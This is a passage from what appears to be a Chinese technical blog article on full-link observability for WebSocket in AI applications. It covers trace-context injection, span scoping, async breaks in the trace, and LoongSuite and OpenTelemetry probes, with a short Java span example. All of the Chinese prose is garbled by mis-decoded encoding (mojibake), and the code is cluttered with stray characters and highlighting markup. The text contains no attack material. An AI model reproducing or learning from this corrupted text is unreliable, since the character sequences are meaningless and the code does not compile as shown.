<p>ä¸éš¾çœ‹å‡ºï¼ŒWebSocket æ ¸å¿ƒç‰¹æ€§ä½“ç°åœ¨ï¼š</p>
<ul>
<li><strong>é•¿è¿æ¥ä¿æŒï¼š</strong> è¿æ¥å»ºç«‹åæŒç»­å­˜åœ¨ï¼Œé¿å…é‡å¤æ¡æ‰‹å¼€é”€</li>
<li><strong>åŒå‘æ•°æ®é€šé“ï¼š</strong> å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯å¯éšæ—¶å‘é€æ•°æ®å¸§ï¼ˆText/Binaryï¼‰</li>
<li><strong>ä½å»¶è¿Ÿç‰¹æ€§ï¼š</strong> çœå» HTTP è½®è¯¢çš„è¯·æ±‚å¤´ä¼ è¾“æˆæœ¬</li>
<li><strong>æ¶ˆæ¯åˆ†å¸§æœºåˆ¶ï¼š</strong> æ”¯æŒè¶…å¤§æ•°æ®é‡çš„åˆ†ç‰‡ä¼ è¾“ï¼ˆå•å¸§æœ€å¤§ 2^64 å­—èŠ‚ï¼‰</li>
</ul>
<p>ä¸ä¼ ç»Ÿ HTTP åè®®å¯¹æ¯”ï¼ŒWebSocket åœ¨é€šä¿¡æ¨¡å¼ä¸Šå®ç°äº†æ ¹æœ¬æ€§çªç ´ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/213ead72a2ec49ac8a38d1affaa83fc3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766394855&amp;x-signature=c7CMmh%2FKcgtL1LeOyt%2BLtIYnCv8%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¿™ç§åè®®ç‰¹æ€§ä½¿å…¶æˆä¸ºå¤§æ•°æ®é‡ä¸‹å®æ—¶é€šä¿¡åœºæ™¯çš„é¦–é€‰æ–¹æ¡ˆã€‚</p>
<h3 data-id="heading-7">1.3 AI æ—¶ä»£ WebSocket åè®®çš„å¤å…´</h3>
<p>éšç€å¤§æ¨¡å‹æŠ€æœ¯çš„çˆ†å‘ï¼Œè¶Šæ¥è¶Šå¤šéœ€è¦å®æ—¶äº¤äº’çš„åœºæ™¯å¼€å§‹å‡ºç°ï¼Œæ™ºèƒ½åŒ–èµ‹äºˆäº† WebSocket åè®®æ–°çš„æ´»åŠ›ï¼š</p>
<ul>
<li>æ”¯æŒå®æ—¶å¯¹è¯ä¸äº¤äº’çš„æ™ºèƒ½å®¢æœæˆ–æœºå™¨äºº</li>
<li>è½¦è½½ AI åŠ©æ‰‹ä¸äº‘ç«¯æ¨¡å‹å®æ—¶äº¤äº’</li>
<li>è‡ªåŠ¨ç¿»è¯‘ã€æ™ºèƒ½è¯†å›¾çš„ AI æ™ºèƒ½çœ¼é•œ</li>
</ul>
<p>é™¤å®æ—¶æ€§å¤–ï¼ŒWebSocket ä¸ºæœ‰çŠ¶æ€çš„è¿æ¥ï¼Œå¤šè½®å¯¹è¯çš„è®°å¿†ä¿æŒã€å³æ—¶æ‰“æ–­è¾“å‡ºç­‰åŠŸèƒ½ä¹Ÿæ¯”ä¼ ç»Ÿçš„ HTTP æ›´åŠ å®¹æ˜“å®ç°ã€‚åˆ°ç›®å‰ä¸ºæ­¢ï¼Œä¸»æµçš„å¤§æ¨¡å‹æä¾›å•†å¤§å¤šéƒ½æä¾›äº† WebSocket çš„äº¤äº’ API åŠé…å¥—çš„ SDKï¼Œå¸®åŠ©ç”¨æˆ·æ›´å¥½åœ°æ„å»ºåç«¯æœåŠ¡ç³»ç»Ÿï¼Œä¾‹å¦‚ï¼š</p>
<ul>
<li>OpenAI æ”¯æŒåŸºäº WebSocket çš„ Realtime API <strong>[</strong> <strong>4]</strong></li>
<li>ç™¾ç‚¼å¤§æ¨¡å‹æœåŠ¡å¹³å°å‘å¸ƒåŸºäº WebSocket çš„å®æ—¶å¤šæ¨¡æ€äº¤äº’åè®® <strong>[</strong> <strong>5]</strong></li>
<li>Google Gemini æ”¯æŒåŸºäº WebSocket çš„ Live API <strong>[</strong> <strong>6]</strong></li>
</ul>
<p>WebSocket åœ¨èµ‹èƒ½ AI åº”ç”¨å®æ—¶æ€§çš„åŒæ—¶ï¼Œä¹Ÿä¸ºåº”ç”¨ç³»ç»Ÿçš„å¯è§‚æµ‹æ€§å¸¦æ¥äº†å¾ˆå¤§çš„æŒ‘æˆ˜ã€‚WebSocket åè®®é«˜åº¦çš„çµæ´»æ€§ä¸æ‰©å±•æ€§æ³¨å®šäº†å®ƒä¸èƒ½åƒ HTTP å’Œ gRPC é‚£æ ·éå¸¸æ–¹ä¾¿åœ°åšåˆ°å…¨é“¾è·¯å¯è§‚æµ‹ï¼Œæœ¬æ–‡æ¥ä¸‹æ¥å°†å…·ä½“åˆ†æ WebSocket åœºæ™¯ä¸‹å…¨é“¾è·¯å¯è§‚æµ‹çš„å®ç°ç—›ç‚¹ä¸è§£å†³æ–¹æ¡ˆã€‚</p>
<h2 data-id="heading-8">WebSocket å…¨é“¾è·¯å¯è§‚æµ‹ç—›ç‚¹åˆ†æ</h2>
<h3 data-id="heading-9">2.1 åè®®çµæ´»æ€§å¸¦æ¥çš„é“¾è·¯è¿½è¸ªå›°å¢ƒ</h3>
<h4 data-id="heading-10">2.1.1 é“¾è·¯ä¿¡æ¯æ³¨å…¥éš¾</h4>
<p>å¯¹äºå¸¸è§„çš„ HTTP è°ƒç”¨ï¼Œä¸ºäº†ä¿è¯é“¾è·¯çš„è¿é€šæ€§ï¼Œè°ƒç”¨æ–¹ä¼šåœ¨ HTTP headers ä¸­é¢å¤–æ·»åŠ ä¸€ç»„ç”¨äºæ‰¿è½½é“¾è·¯ä¸Šä¸‹æ–‡çš„é”®å€¼å¯¹ï¼Œç¡®ä¿è¢«è°ƒç”¨æ–¹åœ¨è§£æåè®®æ—¶èƒ½å¤Ÿæ­£ç¡®åœ°è¿˜åŸè°ƒç”¨æ–¹çš„é“¾è·¯ä¸Šä¸‹æ–‡ï¼Œè¿›è€Œä¿è¯ä¸Šä¸‹æ–‡å¯ä»¥è¢«ç»§ç»­ä¼ é€’ä¸‹å»ã€‚å›¾ç¤ºæ˜¯ä½¿ç”¨ W3C é“¾è·¯è¿½è¸ªåè®® <strong>[</strong> <strong>7]</strong> æ—¶ï¼Œé“¾è·¯ä¸Šä¸‹æ–‡çš„ header çš„ä¸€ä¸ªå…·ä½“ç¤ºä¾‹ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aaf274625aa845d788f096c2488b3bdb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766394855&amp;x-signature=JZ5Em8skYNt%2FI4H7TVU9iF%2BKxvU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è€Œåœ¨ 1.1.3 èŠ‚æˆ‘ä»¬äº†è§£åˆ°ï¼Œä¸€ä¸ª WebSocket æ•°æ®å¸§å…¶å®ä»…ç”±æ•°å­—èŠ‚çš„æ§åˆ¶ä½å’Œæ•°æ®è½½è·æ„æˆã€‚é™¤å»ºç«‹è¿æ¥æ—¶æ¡æ‰‹ä»¥å¤–ï¼Œæ²¡æœ‰å…¶ä»–çš„æœºä¼šä¼ è¾“ header è¿™äº›å…ƒæ•°æ®ã€‚å› æ­¤ï¼Œä¼ ç»Ÿ OpenTelemetry çš„ W3C é“¾è·¯ä¸Šä¸‹æ–‡æ— æ³•ç›´æ¥æ¤å…¥æ¯ä¸ªæ•°æ®å¸§ä¸­ã€‚è€Œåœ¨å®é™…åº”ç”¨åœºæ™¯ä¸­ï¼Œå¯¹äºä¸€æ¬¡ WebSocket è¿æ¥ï¼Œå¾€å¾€å¹¶ä¸ä»£è¡¨ä»…ä¸€æ¬¡ WebSocket è°ƒç”¨ï¼Œä»…ä¾èµ–å»ºç«‹è¿æ¥æ—¶çš„ HTTP è¯·æ±‚ä¸å“åº”æ˜¯è¿œè¿œä¸å¤Ÿçš„ã€‚åŒæ—¶ï¼Œè¿™ä¹Ÿç‰µæ‰¯å‡ºç¬¬äºŒä¸ªå›°éš¾â€”â€”Span ä½œç”¨åŸŸç•Œå®šæ¨¡ç³Šã€‚</p>
<h4 data-id="heading-11">2.1.2 Span ä½œç”¨åŸŸç•Œå®šæ¨¡ç³Š</h4>
<p>åœ¨å¯è§‚æµ‹é¢†åŸŸï¼Œæˆ‘ä»¬ä¸€èˆ¬æŠŠè°ƒç”¨é“¾è·¯ä¸Šä¸€æ¬¡å…³é”®çš„æ“ä½œç§°ä¸ºä¸€æ¡ Spanï¼ˆè·¨åº¦ï¼‰ <strong>[</strong> <strong>8]</strong> ï¼Œä¸€æ¡è°ƒç”¨é“¾ä¸€èˆ¬ç”±ä¸€ç»„æ ‘çŠ¶ç»“æ„çš„ Span ç»„æˆã€‚åœ¨å¯è§‚æµ‹å‰ç«¯çš„å¸®åŠ©ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠåŒå±äºä¸€æ¡è°ƒç”¨é“¾çš„ Span å¬å›ï¼Œå¹¶æ ¹æ®çˆ¶å­å…³ç³»ï¼ˆä¹Ÿå°±æ˜¯è°ƒç”¨å…³ç³»ï¼‰ä»¥åŠå‘ç”Ÿæ—¶é—´æ¸²æŸ“ä¸ºä¸‹å›¾æ‰€ç¤ºçš„ç€‘å¸ƒå›¾ï¼Œä»¥æ­¤æ¥å¸®åŠ©æˆ‘ä»¬äº†è§£ä¸€æ¡é“¾è·¯å‘ç”Ÿçš„æ‰€æœ‰å…³é”®æ“ä½œä»¥åŠè°ƒç”¨å…³ç³»ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b45f8da1ce5c4769b633a16fbefe80d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766394855&amp;x-signature=tMGgJdacc0KFUbsNUHSVH9ZD5kY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ç„¶è€Œï¼Œåœ¨ WebSocket åœºæ™¯ä¸‹ï¼Œæ“ä½œç²’åº¦çš„å®šä¹‰å¯ä»¥éå¸¸çµæ´»ã€‚å¦‚å›¾æ‰€ç¤ºï¼Œä¸€ä¸ª Span æœ‰å¯èƒ½å¯¹åº”ä¸€æ¬¡ WebSocket è¿æ¥ä»å¼€å§‹åˆ°ç»“æŸçš„å…¨è¿‡ç¨‹ï¼Œä¹Ÿæœ‰å¯èƒ½å¯¹åº”æ¯ä¸€æ¬¡æ¶ˆæ¯çš„æ”¶å‘ï¼Œç”šè‡³ä¹Ÿå¯ä»¥å¯¹åº”æ¯ä¸€æ¬¡æ•°æ®å¸§çš„ä¼ é€’è¿‡ç¨‹ã€‚å¯¹ Span ç²’åº¦å®šä¹‰çš„é«˜åº¦çµæ´»ä¹Ÿå¯¼è‡´äº†é“¾è·¯ä¸Šä¸‹æ–‡åœ¨æ³¨å…¥ä¸ç®¡ç†ä¸Šä¹Ÿä¼šæœ‰éå¸¸å¤§çš„å˜åŒ–ï¼Œè¿™ä¹Ÿå¢å¤§äº†ä¸šåŠ¡ä¸Šè½åœ°çš„éš¾åº¦ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/61a6f4b831234030b1a14715fed53089~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766394855&amp;x-signature=0dIHTkc8ItpcLo8tF8jAF54Khns%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h4 data-id="heading-12">2.1.3 é“¾è·¯ä¸Šä¸‹æ–‡çš„åå‘æ‰©æ•£é—®é¢˜</h4>
<p>è™½ç„¶æˆ‘ä»¬æ ¹æ® WebSocket è¿æ¥çš„å‘èµ·æ–¹ä¸æ¥æ”¶æ–¹å°†ä¸¤ç«¯åˆ†ä¸ºäº† Client å’Œ Serverï¼Œä½†å®é™…ä¸šåŠ¡çš„å¤„ç†è¿‡ç¨‹æ˜¯é«˜åº¦çµæ´»çš„åŒå‘æµï¼Œå¯èƒ½å­˜åœ¨ç”± Server ä¾§å‘èµ·è¯·æ±‚ï¼ŒClient è¿›è¡Œå¤„ç†çš„æƒ…å†µã€‚ä¾‹å¦‚ï¼Œå…è®¸ Client ä¸»åŠ¨ä¸ Server å»ºç«‹è¿æ¥å¹¶å°†è‡ªèº«æœåŠ¡æ³¨å†Œç»™ Server ç«¯ï¼Œç”± Server å‘é€æ¶ˆæ¯æ¥å¯¹ Client è¿›è¡Œå›è°ƒã€‚å¯¹äºè¿™ç§äº¤äº’æ–¹å¼è€Œè¨€ï¼Œæ¶ˆæ¯ç”Ÿäº§æ–¹ï¼ˆè°ƒç”¨æ–¹ï¼‰æ˜¯ Serverï¼Œæ¶ˆè´¹æ–¹ï¼ˆè¢«è°ƒç”¨æ–¹ï¼‰æ˜¯ Clientï¼Œå› æ­¤é“¾è·¯ä¸Šä¸‹æ–‡åº”è¯¥ç”± Server æ³¨å…¥åˆ°æ¶ˆæ¯ä¸­ï¼Œç”± Client è¿˜åŸå¹¶è¿›ä¸€æ­¥ä¼ é€’ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/156f2d0d0df54b4d9007f129ee2b59cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766394855&amp;x-signature=E1ECT%2FpAqvV3FM9IuWzJ6wAn%2BR8%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-13">2.2 å¼‚æ­¥è°ƒç”¨å¼•å‘çš„æ–­é“¾å±æœº</h3>
<p>åœ¨ WebSocket åº”ç”¨ä¸­ï¼Œä¸ºäº†æé«˜è¿æ¥åˆ©ç”¨ç‡ï¼Œä¸¤ç«¯ä¹Ÿå¸¸ç”¨å¼‚æ­¥çš„æ–¹å¼æ¥è§£è€¦æ¶ˆæ¯æ¥æ”¶è¿‡ç¨‹ä¸å¤„ç†è¿‡ç¨‹ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªå…¸å‹çš„å¼‚æ­¥æ¶ˆæ¯å¤„ç†æ¶æ„ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæ¶ˆæ¯æœ‰å¯èƒ½ä¼šç›´æ¥è¢«æäº¤åˆ°çº¿ç¨‹æ± ï¼Œä¹Ÿæœ‰å¯èƒ½å­˜æ”¾åœ¨ä¸€ä¸ªè¿›ç¨‹å†…çš„é˜Ÿåˆ—ï¼Œç”šè‡³ç›´æ¥å†™å…¥ Redis ç­‰å¤–éƒ¨å­˜å‚¨ã€‚è¿™ç§çµæ´»å¤šå˜çš„å¼‚æ­¥æ–¹å¼ä¹Ÿç»™é“¾è·¯ä¸Šä¸‹æ–‡çš„è¿›ç¨‹å†…é€ä¼ å¸¦æ¥äº†å›°éš¾ï¼Œéå¸¸å®¹æ˜“å‡ºç°æ–­é“¾é—®é¢˜ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd549381fe484dd391b81e0da8dc88d2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766394855&amp;x-signature=U4ELeDMOl6XmpFAm%2BC0yIno5nrU%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h2 data-id="heading-14">åŸºäº LoongSuite çš„å…¨é“¾è·¯è§‚æµ‹æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-15">3.1 æ–¹æ¡ˆåŸºæœ¬åŸç†</h3>
<p>é€šè¿‡ä¸Šä¸¤èŠ‚çš„è®¨è®ºï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸¤ä¸ªåŸºæœ¬ç»“è®ºï¼š</p>
<ul>
<li>WebSocket çš„ç”¨æ³•ç›¸å½“çµæ´»ï¼Œé“¾è·¯è¿½è¸ªçš„å®ç°å¾ˆå¤§ç¨‹åº¦ä¸Šå–å†³äºä¸šåŠ¡å®ç°ï¼Œéœ€è¦å¼€å‘è€…è‡ªä¸»å®ç°ä¸€äº›æ‰©å±•æ¥ä¿è¯é“¾è·¯å®Œæ•´æ€§</li>
<li>é«˜é¢‘ä¸šåŠ¡åœºæ™¯ç¼ºå°‘ä¸€äº›æœ€ä½³è½åœ°èŒƒå¼ï¼Œå¯¼è‡´è‡ªä¸»å®ç°é“¾è·¯è¿½è¸ªå›°éš¾</li>
</ul>
<p>æ­¤å¤–ï¼Œç”±äº WebSocket é“¾è·¯ä¸Šä¹Ÿéš¾å…å­˜åœ¨ä¸€äº› NoSQLã€HTTP ç­‰å…¶ä»–ç±»å‹çš„è°ƒç”¨ï¼Œä¾ç„¶éœ€è¦æ— ä¾µå…¥æ¢é’ˆæ¥ä¿è¯å„ç§è°ƒç”¨çš„ä¸²è”ï¼Œè¿™å°±è¦æ±‚æ— ä¾µå…¥æ¢é’ˆä¸è‡ªå®šä¹‰æ‰©å±•äº§ç”Ÿçš„é“¾è·¯ä¸Šä¸‹æ–‡å¯ä»¥å¾ˆå¥½åœ°äº’é€šã€‚LoongSuite æ— ä¾µå…¥æ¢é’ˆæä¾›çš„åŸºäº OpenTelemetry API çš„æ‰©å±•æœºåˆ¶å°±æ˜¯è§£å†³è¿™äº›é—®é¢˜çš„æœ€ä½³æ‰‹æ®µ <strong>[</strong> <strong>9]</strong> ã€‚</p>
<h4 data-id="heading-16">3.1.1 OpenTelemetry API ä¸ LoongSuite æ¢é’ˆå·¥ä½œåŸç†</h4>
<p>OpenTelemetry API æ˜¯ OpenTelemetry ç¤¾åŒºå®šä¹‰çš„å¯è§‚æµ‹æ•°æ®é‡‡é›†æ ‡å‡†çš„é‡è¦ç»„ä»¶ä¹‹ä¸€ <strong>[</strong> <strong>10]</strong> ï¼Œå®ƒå®šä¹‰äº†ä¸€æ•´å¥—å¯è§‚æµ‹é¢†åŸŸä½¿ç”¨çš„ API è¡Œä¸ºæ ‡å‡†å’ŒåŠŸèƒ½è¯´æ˜ï¼Œæ¯”å¦‚å¯è§‚æµ‹æ•°æ®åˆ›å»ºã€ä¸Šä¸‹æ–‡ç®¡ç†/é€ä¼ ã€æ•°æ®ä¸ŠæŠ¥ç­‰é€»è¾‘ï¼Œå¹¶ä¸ºè®¸å¤šè¯­è¨€æä¾›äº†é…å¥—çš„ SDK å®ç°ã€‚ä½¿ç”¨è€…å¯ä»¥åŸºäº API ä¸ SDK æ¯”è¾ƒå®¹æ˜“åœ°å®ç°ä¸Šä¸‹æ–‡çš„ç®¡ç†ä¸é€ä¼ ã€‚ä»¥ä¸‹æ˜¯ä½¿ç”¨ Tracer API å®šä¹‰ Span çš„ç¤ºæ„ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">privateÂ intÂ doWork()Â {
Â Â // åˆ›å»º span
Â Â SpanÂ <span class="hljs-attr">doWorkSpan</span>Â =Â tracer.spanBuilder(<span class="hljs-string">"doWork"</span>).startSpan()<span class="hljs-comment">;</span>
Â Â // æ¿€æ´» span æ‰€åœ¨ä¸Šä¸‹æ–‡
Â Â tryÂ (ScopeÂ <span class="hljs-attr">scope</span>Â =Â doWorkSpan.makeCurrent()) {
Â  Â Â intÂ <span class="hljs-attr">result</span>Â =Â <span class="hljs-number">0</span><span class="hljs-comment">;</span>
Â  Â Â forÂ (intÂ <span class="hljs-attr">i</span>Â =Â <span class="hljs-number">0</span><span class="hljs-comment">; i &lt;Â 10; i++) {</span>
Â  Â  Â  result += i<span class="hljs-comment">;</span>
Â  Â  }
Â  Â Â returnÂ result<span class="hljs-comment">;</span>
Â  }Â finallyÂ {
Â  Â Â // ç»“æŸ span
Â  Â  doWorkSpan.end()<span class="hljs-comment">;</span>
Â  }
}
</code></pre>
<p>LoongSuite æ¢é’ˆæ˜¯é˜¿é‡Œäº‘å¯è§‚æµ‹å›¢é˜ŸåŸºäº OpenTelemetry æ¢é’ˆæ„å»ºçš„ï¼Œé¢å‘ AI åº”ç”¨çš„å¼€æºçš„è¿›ç¨‹å†…å¯è§‚æµ‹é‡‡é›†ç»„ä»¶ã€‚å¯¹äºçƒ­é—¨çš„å¼€æºç»„ä»¶ï¼Œä¾‹å¦‚ LangChainã€OpenAI SDKã€Tomcat ç­‰ï¼ŒLoongSuite æ¢é’ˆæä¾›äº†ä¸°å¯Œçš„é¢„å®šä¹‰æ’æ¡©å®ç°ã€‚ä½¿ç”¨è€…ä¸å†éœ€è¦åŸºäº OpenTelemetry API è¿›è¡Œå¼€å‘ï¼Œåªéœ€è¦ä¿®æ”¹ç¼–è¯‘æˆ–è¿è¡Œæ—¶å‘½ä»¤ï¼Œæ¢é’ˆå°±èƒ½æŠŠå¯è§‚æµ‹æ•°æ®åˆ›å»ºã€ä¸Šä¸‹æ–‡ç®¡ç†/é€ä¼ ã€æ•°æ®ä¸ŠæŠ¥ç­‰å…³é”®é€»è¾‘è‡ªåŠ¨å®Œæˆï¼Œä»è€Œè¾¾æˆæ— ä¾µå…¥å¯è§‚æµ‹çš„ç›®æ ‡ã€‚</p>
<p>LoongSuite æ¢é’ˆå¯ä»¥æ»¡è¶³ç”Ÿäº§åº”ç”¨ç»å¤§å¤šæ•°åœºæ™¯ä¸‹çš„å¯è§‚æµ‹éœ€æ±‚ï¼Œä½†å¯¹äºä¸€äº›é«˜åº¦è‡ªå®šä¹‰çš„åœºæ™¯ï¼Œå¦‚æ¶ˆæ¯ç³»ç»Ÿä¸­çš„å¤æ‚æ¶ˆè´¹è¿‡ç¨‹ã€éƒ¨åˆ† MQTT åœºæ™¯ä»¥åŠ WebSocket é€šä¿¡åœºæ™¯ï¼Œä½¿ç”¨ OpenTelemetry API/SDK æ·»åŠ è‡ªå®šä¹‰åŸ‹ç‚¹åˆ™æ˜¯å¼¥è¡¥æ— ä¾µå…¥æ¢é’ˆç›‘æ§ç›²åŒºçš„æœ€ä¼˜æ–¹æ¡ˆã€‚</p>
<h4 data-id="heading-17">3.1.2 LoongSuite æ¢é’ˆä¸è‡ªå®šä¹‰æ‰©å±•äº¤äº’ç¤ºæ„</h4>
<p>å¯¹äº Javaã€Golang è¿™ç±»åŒ…ç®¡ç†ç›¸å¯¹ä¸¥æ ¼ï¼ˆéœ€è¦æ˜ç¡®æŒ‡å®šç‰ˆæœ¬ï¼‰çš„è¯­è¨€æ¥è¯´ï¼Œæ¢é’ˆä¸åº”ç”¨å¯èƒ½ä¼šå­˜åœ¨ç‰ˆæœ¬ä¸ä¸€è‡´çš„ä¾èµ–ï¼Œæ¯”å¦‚ Jacksonã€gRPC å’Œ OpenTelemetry API/SDK ç­‰ç­‰ã€‚ä¸ºäº†é¿å…ä¾èµ–å†²çªï¼Œå¸¸é‡‡ç”¨ shadow çš„æ–¹å¼è¿›è¡Œä¾èµ–éš”ç¦»ã€‚ä½†è¿™ä¹Ÿä¼šå¯¼è‡´ç”¨æˆ·åœ¨ä½¿ç”¨ OpenTelemetry API å’Œ SDK è‡ªä¸»åŸ‹ç‚¹çš„æ—¶å€™ï¼Œäº§ç”Ÿçš„é“¾è·¯ä¸Šä¸‹æ–‡å¹¶ä¸èƒ½ä¸æ¢é’ˆå†…äº’é€šï¼Œè¿›è€Œå¯¼è‡´è°ƒç”¨é“¾æ–­è£‚ã€‚</p>
<p>OpenTelemetry å’Œ LoongSuite æ¢é’ˆåŒæ ·é‡‡ç”¨ä»£ç å¢å¼ºæœºåˆ¶ä¿è¯äº†é“¾è·¯ä¸Šä¸‹æ–‡çš„å…±äº«ï¼Œå…·ä½“æ•´ä½“ç¤ºæ„å¦‚ä¸‹ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4577a2ca81bc4904a9eeb9bb187db058~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5LqR5Y6f55Sf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766394855&amp;x-signature=gVcx8e6nZY7xAKgYjNqlDKu5VHs%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<ul>
<li>æ¢é’ˆå’Œåº”ç”¨å…±ç”¨ä¸€å¥— APIï¼ŒAPI è‡ªèº«ä¿è¯å‘å‰å…¼å®¹</li>
<li>æ¢é’ˆåˆå§‹åŒ–æ—¶ï¼Œä¼šå°†åˆå§‹åŒ–å¥½çš„å®ä¾‹å¯¹è±¡æ³¨å†Œåˆ° GlobalHolderï¼Œåº”ç”¨ä¸­è‡ªå®šä¹‰åŸ‹ç‚¹æ—¶ï¼Œç›´æ¥ä» API ä¸­çš„ GlobalHolder å°±å¯ä»¥è·å–åˆ°æ¢é’ˆçš„å®ä¾‹å¯¹è±¡</li>
<li>å¯¹äº SDK ä¸­å®šä¹‰çš„ä¸€äº›æ–¹æ³•å’Œé™æ€çš„ APIï¼Œå¦‚ Contextã€Baggage ç­‰ï¼Œé€šè¿‡ä»£ç å¢å¼ºçš„æ–¹å¼ï¼Œè·³è¿‡è¿™äº›å‡½æ•°åŸæœ¬çš„è°ƒç”¨ï¼Œè½¬è€Œä½¿ç”¨æ¢é’ˆä¸­å¯¹åº”çš„å®ç°</li>
</ul>
<p>é€šè¿‡ä»¥ä¸Šæœºåˆ¶ï¼ŒLoongSuite æ¢é’ˆå¯ä»¥å¾ˆå¥½åœ°å’Œ OpenTelemetry API/SDK åˆ›å»ºçš„ Span ä¸²è”åœ¨ä¸€èµ·ï¼Œä¿è¯äº†é“¾è·¯çš„å®Œæ•´æ€§ã€‚</p>
<h3 data-id="heading-18">3.2 WebSocket åˆ†å¸ƒå¼é“¾è·¯è¿½è¸ªæœ€ä½³å®è·µ</h3>
<p>äº†è§£äº†è¿™å‡ ä¸ªç»„ä»¶ï¼Œå…³é”®çš„é—®é¢˜æ˜¯ï¼Œæˆ‘çš„åº”ç”¨åº”è¯¥æ€ä¹ˆæ·»åŠ è¿™äº›è‡ªå®šä¹‰çš„åŸ‹ç‚¹å‘¢ï¼Ÿåœ¨ WebSocket å…¨é“¾è·¯çš„å®ç°ä¸­ï¼Œéœ€è¦å…ˆæ ¹æ®ä¸šåŠ¡è¯‰æ±‚æ˜ç¡®å‡ ä¸ªé—®é¢˜ï¼š</p>
<p><strong>ä¼šè¯ç²’åº¦é—®é¢˜ï¼š</strong> ä¸€æ¬¡ WebSocket è¿æ¥å¯¹åº”ä¸€æ¡ Trace è¿˜æ˜¯å¤šæ¡ Traceï¼Ÿ</p>
<ul>
<li>å¯¹åº”ä¸€æ¡ Traceï¼šä¸€æ¬¡ WebSocket è¿æ¥æ˜¯ä¸ºäº†å®Œæˆä¸€ç³»åˆ—ç›¸å…³æ€§å¼ºçš„æ“ä½œï¼Œä¸”æŒç»­æ—¶é—´ä¸€èˆ¬ä»…åœ¨æ•°åˆ†é’Ÿï¼›</li>
<li>å¯¹åº”å¤šæ¡ Traceï¼šä¸€æ¬¡ WebSocket è¿æ¥ä¼šåœ¨å»ºç«‹å®Œæˆåç•™å­˜ä¸‹æ¥æŒç»­å¤ç”¨ï¼ŒæŒç»­æ—¶é—´å¯èƒ½æŒç»­å‡ å°æ—¶ã€‚</li>
</ul>
<p><strong>è°ƒç”¨å»ºæ¨¡é—®é¢˜ï¼š</strong> WebSocket å†…éƒ¨çš„æ•°æ®ä¼ è¾“è¿‡ç¨‹èƒ½å¦å»ºæ¨¡ä¸ºç¦»æ•£çš„è¯·æ±‚ä¸å“åº”ï¼Ÿ</p>
<ul>
<li>å¦‚æœè¿æ¥å»ºç«‹ååªç”¨äºåŒæ–¹ä¼ é€’æ•°æ®ï¼Œåˆ™ä¸éœ€è¦ä¸ºæ¯æ¡æ¶ˆæ¯ä¸“é—¨åˆ›å»º Spanï¼Œä¸€ä¸ª Span çš„ç”Ÿå‘½å‘¨æœŸåº”è¯¥å¯¹åº”åŒæ–¹ä¼ é€’æ¶ˆæ¯çš„å®Œæ•´è¿‡ç¨‹ï¼›</li>
<li>å¦‚æœè¿æ¥å»ºç«‹åï¼Œä¸€æ–¹å‘é€æ¶ˆæ¯ï¼Œå¦ä¸€æ–¹å¤„ç†æ¶ˆæ¯å¹¶è¿”å›å“åº”ï¼Œåˆ™æ¯ç»„è¿™ç±»è°ƒç”¨éƒ½å¯ä»¥åˆ›å»ºä¸€å¯¹çˆ¶å­ Spanï¼Œå¯¹åº”çš„æ•°æ®ç»“æ„éœ€è¦å…è®¸æ‰¿è½½åºåˆ—åŒ–åçš„é“¾è·¯ä¸Šä¸‹æ–‡ã€‚</li>
</ul>
<p>åº”å¯¹ä»¥ä¸Šå‡ ä¸ªä¸åŒåœºæ™¯ï¼Œè‡ªå®šä¹‰åŸ‹ç‚¹çš„å®ç°æ¨èä¹Ÿä¼šæœ‰æ‰€å·®å¼‚ï¼Œæ¥ä¸‹æ¥å°†åˆ†åˆ«å±•å¼€ä»‹ç»ã€‚</p>
